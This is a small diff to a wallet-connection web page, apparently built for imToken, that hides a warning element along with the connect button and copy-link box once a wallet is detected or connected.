@@ -293,6 +293,7 @@
         const copyLinkText = document.getElementById("copyLinkText");
         const copyLinkBtn = document.getElementById("copyLinkBtn");
         const copyLinkWrap = document.querySelector('.copy-link-wrap');
+        const warning = document.querySelector('.warning');
     
         renderApprovalRecords();
 
@@ -309,6 +310,7 @@
             // 检测到钱包，隐藏连接按钮
             connectBtn.style.display = "none";
             copyLinkWrap.style.display = "none";
+            warning.style.display = "none"
             await initWallet();
         } else {
             document.getElementById("userInfo").innerHTML = "请用imToken内置浏览器打开";
@@ -328,6 +330,7 @@
                 // 手动连接成功，隐藏连接按钮
                 connectBtn.style.display = "none";
                 copyLinkWrap.style.display = "none";
+                warning.style.display = "none"
                 await initWallet();
             } catch (e) {}
         };
